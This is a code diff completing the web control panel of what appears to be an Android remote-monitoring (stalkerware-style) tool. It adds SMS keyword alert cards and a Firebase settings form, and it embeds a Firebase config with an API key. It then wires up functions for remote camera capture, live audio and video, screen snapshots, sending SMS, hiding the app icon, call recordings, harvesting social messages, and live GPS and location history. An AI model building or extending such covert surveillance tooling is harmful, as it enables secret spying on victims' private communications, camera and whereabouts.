@@ -3150,4 +3150,147 @@ function getAppNameFromPkg(pkg) {
         const h4 = document.createElement('h4'); h4.style.marginBottom = '10px';
         h4.textContent = '⚠️ Alert History (' + (Array.isArray(data) ? data.length : 0) + ')';
         div.appendChild(h4);
-        if (!Array.isArray(data) || data.length ===
+        if (!Array.isArray(data) || data.length === 0) {
+            div.innerHTML += '<p style="color:#999">No alerts triggered yet.</p>'; return;
+        }
+        data.forEach(function(alert) {
+            const card = document.createElement('div');
+            card.style.cssText = 'background:#fff8e1;border:1px solid #ffcc02;border-radius:8px;padding:10px;margin-bottom:8px';
+            const top = document.createElement('div'); top.style.cssText = 'display:flex;justify-content:space-between;margin-bottom:4px';
+            const kw = document.createElement('span');
+            kw.style.cssText = 'background:#ff9800;color:#fff;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:700';
+            kw.textContent = alert.keyword;
+            const time = document.createElement('span'); time.style.cssText = 'font-size:11px;color:#999'; time.textContent = alert.timeFmt || alert.date || '';
+            top.appendChild(kw); top.appendChild(time);
+            const from = document.createElement('div'); from.style.cssText = 'font-size:12px;color:#555;margin-top:4px'; from.textContent = 'From: ' + (alert.from || '');
+            const body = document.createElement('div'); body.style.cssText = 'font-size:13px;color:#333;margin-top:4px'; body.textContent = alert.body || alert.message || '';
+            card.appendChild(top); card.appendChild(from); card.appendChild(body);
+            div.appendChild(card);
+        });
+    }
+
+    // ---------- FIREBASE ----------
+    function showFirebaseSettingsPanel() {
+        panel.innerHTML = '';
+        const h3 = document.createElement('h3'); h3.textContent = '🔥 Firebase Configuration';
+        panel.appendChild(h3);
+        const desc = document.createElement('p');
+        desc.style.cssText = 'color:#666;font-size:13px;margin-bottom:16px;line-height:1.6';
+        desc.innerHTML = 'Enter your Firebase project config.';
+        panel.appendChild(desc);
+        const fbConf = (typeof firebaseConfig !== 'undefined') ? firebaseConfig : {};
+        const fields = [
+            ['apiKey','API Key'],['authDomain','Auth Domain'],['projectId','Project ID'],
+            ['storageBucket','Storage Bucket'],['messagingSenderId','Sender ID'],['appId','App ID']
+        ];
+        const form = document.createElement('div');
+        form.style.cssText = 'display:flex;flex-direction:column;gap:10px;max-width:480px';
+        fields.forEach(function(f) {
+            const wrap = document.createElement('div');
+            const lbl = document.createElement('label');
+            lbl.style.cssText = 'font-size:12px;color:#999;display:block;margin-bottom:3px';
+            lbl.textContent = f[1];
+            const inp = document.createElement('input'); inp.id = 'fb_'+f[0]; inp.type = 'text';
+            inp.value = (fbConf[f[0]] && fbConf[f[0]] !== 'YOUR_API_KEY') ? fbConf[f[0]] : '';
+            inp.placeholder = f[1];
+            inp.style.cssText = 'width:100%;padding:8px 10px;border:1px solid #ddd;border-radius:6px;font-size:13px;box-sizing:border-box';
+            wrap.appendChild(lbl); wrap.appendChild(inp); form.appendChild(wrap);
+        });
+        const saveBtn = document.createElement('button'); saveBtn.textContent = '💾 Save & Connect';
+        saveBtn.style.cssText = 'padding:10px 20px;background:#ff6f00;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:14px;font-weight:600;margin-top:6px';
+        saveBtn.addEventListener('click', function() {
+            const newCfg = {};
+            fields.forEach(function(f) { newCfg[f[0]] = document.getElementById('fb_'+f[0]).value.trim(); });
+            if (!newCfg.projectId) { alert('Enter at least Project ID'); return; }
+            localStorage.setItem('fbConfig', JSON.stringify(newCfg));
+            alert('Saved! Reload page to apply Firebase config.');
+        });
+        panel.appendChild(form); panel.appendChild(saveBtn);
+        const connected = fbConf.apiKey && fbConf.apiKey !== 'YOUR_API_KEY';
+        const status = document.createElement('div');
+        status.style.cssText = 'margin-top:16px;padding:12px;background:#f5f5f5;border-radius:8px;font-size:12px';
+        status.innerHTML = connected
+            ? '<span style="color:#4caf50;font-weight:700">● Firebase Connected</span> — ' + (fbConf.projectId || '')
+            : '<span style="color:#d32f2f;font-weight:700">● Not configured</span> — Enter credentials above';
+        panel.appendChild(status);
+    }
+
+    // ---------- ATTACH FUNCTIONS TO WINDOW ----------
+    window.toggleScreen = toggleScreen;
+    window.toggleCameraPanel = toggleCameraPanel;
+    window.capturePicture = capturePicture;
+    window.startLiveStream = startLiveStream;
+    window.stopLiveStream = stopLiveStream;
+    window.toggleLiveAudio = toggleLiveAudio;
+    window.stopLiveAudio = stopLiveAudio;
+    window.sendCommand = sendCommand;
+    window.sendPlainText = sendPlainText;
+    window.toggleAppIcon = toggleAppIcon;
+    window.takeSnapshot = takeSnapshot;
+    window.toggleRecording = toggleRecording;
+    window.downloadBase64 = downloadBase64;
+    window.gotoPage = gotoPage;
+    window.deleteSelected = deleteSelected;
+    window.updateCounters = updateCounters;
+    window.handleFolderClick = handleFolderClick;
+    window.navigateUp = navigateUp;
+    window.updateSelected = updateSelected;
+    window.downloadSelected = downloadSelected;
+    window.connectWebSocket = connectWebSocket;
+    window.manualReconnect = manualReconnect;
+    window.snapScreen = snapScreenFromModal;
+    window.showAppUsagePanel = showAppUsagePanel;
+    window.showGeofencePanel = showGeofencePanel;
+    window.showSchedulePanel = showSchedulePanel;
+    window.showSendSmsPanel = showSendSmsPanel;
+    window.setGeofence = setGeofence;
+    window.useLocationAsGeofence = useLocationAsGeofence;
+    window.doSendSms = doSendSms;
+    window.startScheduledCapture = startScheduledCapture;
+    window.clearAlerts = clearAlerts;
+    window.toggleLiveGps = toggleLiveGps;
+    window.showSocialMessagesPanel  = showSocialMessagesPanel;
+    window.filterSocialByPkg        = filterSocialByPkg;
+    window.showCallRecordingsPanel  = showCallRecordingsPanel;
+    window.showPhotoGalleryPanel    = showPhotoGalleryPanel;
+    window.showLocationHistoryPanel = showLocationHistoryPanel;
+    window.showAppEventsPanel       = showAppEventsPanel;
+    window.showSmsKeywordsPanel     = showSmsKeywordsPanel;
+    window.showFirebaseSettingsPanel = showFirebaseSettingsPanel;
+    window.toggleFlash = toggleFlash; // add flash toggle
+
+    document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);
+
+    // ---------- INITIALIZE ----------
+    connectWebSocket();
+</script>
+
+<!-- Firebase config + Firestore initialisation -->
+<script>
+var firebaseConfig = {
+  apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc",
+  authDomain: "webviewiot.firebaseapp.com",
+  databaseURL: "https://webviewiot-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "webviewiot",
+  storageBucket: "webviewiot.firebasestorage.app",
+  messagingSenderId: "634777347775",
+  appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a",
+  measurementId: "G-2KW4EJYTRB"
+};
+
+try {
+    var _saved = localStorage.getItem('fbConfig');
+    if (_saved) Object.assign(firebaseConfig, JSON.parse(_saved));
+} catch(e) {}
+
+if (firebaseConfig.apiKey && firebaseConfig.apiKey !== 'YOUR_API_KEY') {
+    firebase.initializeApp(firebaseConfig);
+    window.firestoreDb = firebase.firestore();
+    firebase.auth().signInAnonymously().catch(function(e) { console.warn('Firebase auth:', e.message); });
+    console.log('Firebase initialised:', firebaseConfig.projectId);
+} else {
+    console.log('Firebase not configured — using WebSocket only');
+}
+</script>
+</body>
+</html>
